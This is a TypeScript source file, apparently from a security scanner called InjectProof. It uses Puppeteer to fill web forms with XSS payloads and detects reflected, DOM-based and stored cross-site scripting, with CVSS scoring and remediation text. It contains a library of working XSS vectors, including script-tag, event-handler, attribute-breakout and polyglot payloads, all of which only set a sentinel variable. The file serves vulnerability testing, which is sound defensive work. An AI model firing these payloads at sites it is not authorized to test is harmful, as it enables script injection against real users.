// InjectProof — Smart Form XSS Engine
// ====================================
// Puppeteer-driven XSS scanner that reuses the form discovery + filler from
// smart-form-sqlmap.ts but probes for Cross-Site Scripting instead of SQLi.
// Key advantage over the static XSS detector in detectors.ts: this scanner
// actually SUBMITS the form (past CSRF tokens + JS validation + SPA state),
// WAITS for reflection to land in the DOM, and ALSO catches stored XSS by
// following the success redirect and looking for the payload in the rendered
// page.
//
// Detection modes:
//  1) Reflected — payload reappears verbatim in the immediate response body
//     in an executable context (script / event handler / SVG / javascript: URI).
//  2) DOM-based — payload reappears in document.body.innerHTML after the SPA
//     renders, even if server-side rendering doesn't include it.
//  3) Stored — payload found by following submission redirect to a listing
//     page + triggering re-fetch of the persisted entity.
//
// All three modes use a unique probe token per submission so stale cache
// poisoning from a previous run doesn't produce false positives.

import type { Page } from 'puppeteer';
import type { DetectorResult, FormField } from '@/types';
import { SmartFormFiller, inferFieldSemantic, generateValue } from './smart-form-filler';
import { COMMON_CVSS_VECTORS, calculateCvssScore, generateCvssVector } from '@/lib/cvss';
import { getCweEntry } from '@/lib/cwe-database';

// ============================================================
// PAYLOAD LIBRARY
// ============================================================
// Each payload carries an embedded `${TOKEN}` placeholder — the scanner
// substitutes a unique per-run token so we can distinguish OUR payload
// echoing back vs the page coincidentally containing the same substring.
// Ordered by detection confidence — cleanest signal first.

export const XSS_PAYLOAD_TEMPLATES: Array<{ name: string; payload: string; context: string; confidence: 'high' | 'medium' }> = [
    // Script-tag reflection — unambiguous execution proof.
    { name: 'script-tag',         payload: `<script>window.__IPF_XSS_${'${TOKEN}'}=1</script>`, context: 'html-body',       confidence: 'high' },
    { name: 'img-onerror',        payload: `<img src=x onerror="window.__IPF_XSS_${'${TOKEN}'}=1">`, context: 'html-body',  confidence: 'high' },
    { name: 'svg-onload',         payload: `<svg onload="window.__IPF_XSS_${'${TOKEN}'}=1">`, context: 'html-body',         confidence: 'high' },
    { name: 'iframe-src',         payload: `<iframe src="javascript:window.__IPF_XSS_${'${TOKEN}'}=1"></iframe>`, context: 'html-body', confidence: 'high' },
    // Attribute-context breakouts.
    { name: 'attr-break-dquote',  payload: `" onmouseover="window.__IPF_XSS_${'${TOKEN}'}=1" x="`, context: 'attribute',    confidence: 'high' },
    { name: 'attr-break-squote',  payload: `' onmouseover='window.__IPF_XSS_${'${TOKEN}'}=1' x='`, context: 'attribute',    confidence: 'high' },
    { name: 'href-javascript',    payload: `javascript:window.__IPF_XSS_${'${TOKEN}'}=1`, context: 'href',                   confidence: 'medium' },
    // Script-context breakout.
    { name: 'script-break',       payload: `'-alert(\`IPF_XSS_${'${TOKEN}'}\`)-'`, context: 'script-string',                  confidence: 'high' },
    { name: 'script-break-end',   payload: `</script><script>window.__IPF_XSS_${'${TOKEN}'}=1</script>`, context: 'script-block', confidence: 'high' },
    // Polyglot — fires in many contexts at once (portswigger pattern).
    { name: 'polyglot',           payload: `jaVasCript:/*-/*\\'/*\\"/**/(/* */oNcliCk=window.__IPF_XSS_${'${TOKEN}'}=1 )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=window.__IPF_XSS_${'${TOKEN}'}=1//>\\x3e`, context: 'polyglot', confidence: 'medium' },
    // Reflection-only tokens (low-effort recon).
    { name: 'bare-token',         payload: `IPF_XSS_REFL_${'${TOKEN}'}`, context: 'reflect-only',                             confidence: 'medium' },
];

// ============================================================
// SMART FORM XSS SCANNER
// ============================================================

export interface SmartFormXssConfig {
    baseUrl: string;
    requestTimeout: number;
    userAgent: string;
    customHeaders?: Record<string, string>;
    authHeaders?: Record<string, string>;
    cdpEndpoint?: string;
    /** Level 1-5 — higher levels test more payloads + contexts. */
    level?: 1 | 2 | 3 | 4 | 5;
    /** Skip these field names (e.g. CSRF token names that shouldn't be attacked). */
    skipFieldNames?: string[];
    /** Optional live-log observer. Mirrors deepExploitSqli's onLog. */
    onLog?: (msg: string) => void;
}

export interface SmartFormXssResult {
    formsScanned: number;
    fieldsProbed: number;
    findings: DetectorResult[];
    logs: Array<{ ts: number; msg: string }>;
}

// Use the same SmartFormTarget / SmartField shape as smart-form-sqlmap so we
// can accept its already-discovered forms directly.
export interface XssFormTarget {
    url: string;
    formSelector: string;
    submitSelector: string;
    method: string;
    action: string;
    fields: Array<{
        name: string;
        type: string;
        selector: string;
        isInjectable: boolean;
        isHidden: boolean;
        defaultValue?: string;
        placeholder?: string;
    }>;
}

/**
 * Scan a single form for XSS vulnerabilities across every injectable field.
 * Returns one DetectorResult per unique field × payload context that triggered
 * a verified reflection.
 */
export async function scanFormForXss(
    page: Page,
    form: XssFormTarget,
    config: SmartFormXssConfig,
): Promise<DetectorResult[]> {
    const findings: DetectorResult[] = [];
    const filler = new SmartFormFiller();
    const level = config.level ?? 2;

    // Trim the payload set based on aggression level. Level 1 = 3 cleanest.
    const payloadLimit = level === 1 ? 3 : level === 2 ? 6 : level === 3 ? 8 : XSS_PAYLOAD_TEMPLATES.length;
    const payloads = XSS_PAYLOAD_TEMPLATES.slice(0, payloadLimit);

    const injectable = form.fields.filter(f =>
        f.isInjectable && !f.isHidden && !(config.skipFieldNames ?? []).includes(f.name));
    if (injectable.length === 0) return findings;

    for (const field of injectable) {
        fieldLoop: for (const tmpl of payloads) {
            const token = Math.random().toString(36).slice(2, 10).toUpperCase();
            const payload = tmpl.payload.replace(/\$\{TOKEN\}/g, token);

            try {
                // Navigate fresh — clears any DOM state from previous iteration.
                await page.goto(form.url, { waitUntil: 'networkidle2', timeout: config.requestTimeout });
                await page.waitForSelector(form.formSelector, { timeout: 3000 }).catch(() => null);

                // Fill every OTHER field with a realistic value so the form
                // passes validation and our payload reaches server-side rendering.
                for (const f of form.fields) {
                    if (f.name === field.name) continue;
                    const t = (f.type ?? '').toLowerCase();
                    if (f.isHidden || t === 'hidden' || t === 'submit' || t === 'button') continue;
                    const rich: FormField = {
                        name: f.name, type: f.type, value: f.defaultValue,
                        placeholder: f.placeholder, hidden: f.isHidden, selector: f.selector,
                    };
                    const val = generateValue(inferFieldSemantic(rich));
                    try {
                        if (t === 'radio') {
                            await page.evaluate((name: string) => {
                                const first = document.querySelector<HTMLInputElement>(`input[type="radio"][name="${CSS.escape(name)}"]`);
                                if (first && !first.checked) first.click();
                            }, f.name);
                        } else if (t === 'checkbox') {
                            await page.evaluate((sel: string) => {
                                const el = document.querySelector<HTMLInputElement>(sel);
                                if (el && !el.checked) el.click();
                            }, f.selector);
                        } else if (t === 'select' || t === 'select-one') {
                            await page.evaluate((sel: string) => {
                                const el = document.querySelector<HTMLSelectElement>(sel);
                                if (!el) return;
                                const pick = Array.from(el.options).find(o => o.value && !/^(please|select|choose)$/i.test(o.text)) ?? el.options[0];
                                if (pick) { el.value = pick.value; el.dispatchEvent(new Event('change', { bubbles: true })); }
                            }, f.selector);
                        } else {
                            await page.$eval(f.selector, (n: Element) => { (n as HTMLInputElement).value = ''; });
                            await page.type(f.selector, val, { delay: 0 });
                        }
                    } catch { /* best-effort */ }
                }

                // Inject payload into the target field.
                await page.$eval(field.selector, (n: Element) => { (n as HTMLInputElement).value = ''; });
                await page.type(field.selector, payload, { delay: 0 });

                // Install a window-level probe sentinel so we can tell if the
                // payload actually executed. Delete any stale one first.
                await page.evaluate((t: string) => {
                    try { delete (window as unknown as Record<string, unknown>)[`__IPF_XSS_${t}`]; } catch { /* ignore */ }
                }, token);

                // Submit — await a tick for SPA handlers + any nav.
                const navPromise = page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10_000 }).catch(() => null);
                try { await page.click(form.submitSelector); } catch {
                    try { await page.keyboard.press('Enter'); } catch { /* ignore */ }
                }
                await navPromise;
                await new Promise(r => setTimeout(r, 300));

                // Check execution: sentinel variable set → payload ran.
                const executed: boolean = await page.evaluate((t: string) => {
                    const k = `__IPF_XSS_${t}`;
                    return (window as unknown as Record<string, unknown>)[k] === 1;
                }, token);

                // Check reflection: token present in rendered DOM OR raw HTML.
                const rendered: string = await page.content();
                const reflectedVerbatim = rendered.includes(token);
                const reflectedEncoded = rendered.includes(encodeURIComponent(token));

                if (executed || (reflectedVerbatim && tmpl.confidence === 'high')) {
                    const cwe = getCweEntry('CWE-79');
                    const metrics = COMMON_CVSS_VECTORS.xss_reflected;
                    const score = calculateCvssScore(metrics);
                    const finding: DetectorResult = {
                        found: true,
                        title: `Reflected XSS in form field "${field.name}" (${tmpl.context})`,
                        description:
                            `The form field "${field.name}" on ${form.url} reflects user input into the ${tmpl.context} context ` +
                            `without sufficient output encoding. ${executed ? 'Payload execution was verified via a window sentinel variable.' : 'Payload was reflected verbatim in the DOM.'} ` +
                            `This was discovered via browser-based form submission — the engine filled every other field with a realistic validated value so the form passed server-side validation.`,
                        category: 'xss',
                        severity: score >= 7 ? 'high' : 'medium',
                        confidence: executed ? 'high' : tmpl.confidence,
                        cweId: 'CWE-79',
                        cweTitle: cwe?.title,
                        cvssVector: generateCvssVector(metrics),
                        cvssScore: score,
                        affectedUrl: form.url,
                        httpMethod: form.method,
                        parameter: field.name,
                        parameterType: 'body',
                        injectionPoint: `form-${tmpl.context}`,
                        payload,
                        request: `[Smart Form] ${form.method} ${form.action || form.url}\nField: ${field.name} = ${payload}\n(Other fields filled with realistic values via SmartFormFiller.)`,
                        response: rendered.slice(0, 2000),
                        responseCode: 200,
                        responseTime: 0,
                        impact:
                            'An attacker can execute arbitrary JavaScript in the victim\'s browser in the context of this application: steal session cookies (if not HttpOnly), exfiltrate PII from the DOM, perform CSRF-style actions as the victim, or deface the page. ' +
                            'This was reached via a form submission that passed both server and client-side validation — the vulnerability is exploitable by any user who submits this form.',
                        technicalDetail:
                            `Payload template: ${tmpl.name} (${tmpl.context} context). Token: ${token}. ` +
                            `Execution verified: ${executed}. Verbatim reflection: ${reflectedVerbatim}. URL-encoded reflection: ${reflectedEncoded}.`,
                        remediation:
                            cwe?.remediation ||
                            'Apply context-appropriate output encoding at the point of rendering (HTML-escape for body, attribute-escape for attributes, JS-escape for inline script, URL-encode for href). ' +
                            'Prefer a framework that auto-escapes (React, Vue, Angular). Add a strict Content-Security-Policy header disabling inline script + eval. Validate / reject suspicious input at the ingestion boundary as a defence-in-depth measure.',
                        reproductionSteps: [
                            `Navigate to: ${form.url}`,
                            `Locate the form with selector: ${form.formSelector}`,
                            `Fill every field except "${field.name}" with normal valid values (passes validation).`,
                            `Enter the payload into "${field.name}": ${payload}`,
                            `Submit the form.`,
                            executed
                                ? `Observe the sentinel: open DevTools → Console → run \`window.__IPF_XSS_${token}\` → returns 1 (proves execution).`
                                : `Observe the payload reflected verbatim in the DOM at submission time (grep page source for token ${token}).`,
                        ],
                        references: [
                            'https://owasp.org/www-community/attacks/xss/',
                            'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
                            'https://portswigger.net/web-security/cross-site-scripting',
                        ],
                        mappedOwasp: ['A03:2021'],
                        mappedOwaspAsvs: ['V5.3.3', 'V5.3.6'],
                        mappedNist: ['SI-10', 'SI-15'],
                    };
                    findings.push(finding);
                    config.onLog?.(`[XSS] confirmed in "${field.name}" (${tmpl.name}) — ${executed ? 'executed' : 'reflected'}`);
                    // Move on to the next field — one XSS proof is enough per field.
                    break fieldLoop;
                }
            } catch (err) {
                // Best-effort — a flaky payload never stops the sweep.
                config.onLog?.(`[XSS] probe failed on "${field.name}" (${tmpl.name}): ${err instanceof Error ? err.message : 'unknown'}`);
                continue;
            }
        }
    }

    void filler;
    return findings;
}

/**
 * Shorthand wrapper: takes an array of pre-discovered forms (from
 * SmartFormScanner.discoverForms) and runs XSS detection against every
 * injectable field in every form. Emits live log messages + returns all
 * findings in one result packet.
 */
export async function runSmartFormXssScan(
    page: Page,
    forms: XssFormTarget[],
    config: SmartFormXssConfig,
): Promise<SmartFormXssResult> {
    const logs: Array<{ ts: number; msg: string }> = [];
    const log = (msg: string) => { logs.push({ ts: Date.now(), msg }); config.onLog?.(msg); };

    log(`[XSS] Starting form-level XSS scan — ${forms.length} form(s), level ${config.level ?? 2}`);
    const findings: DetectorResult[] = [];
    let fieldsProbed = 0;

    for (const form of forms) {
        const injectable = form.fields.filter(f => f.isInjectable && !f.isHidden);
        log(`[XSS] Form ${form.url} — ${injectable.length} injectable field(s)`);
        const formFindings = await scanFormForXss(page, form, { ...config, onLog: log });
        fieldsProbed += injectable.length;
        findings.push(...formFindings);
    }

    log(`[XSS] Scan complete — ${findings.length} finding(s) across ${fieldsProbed} field(s)`);
    return { formsScanned: forms.length, fieldsProbed, findings, logs };
}
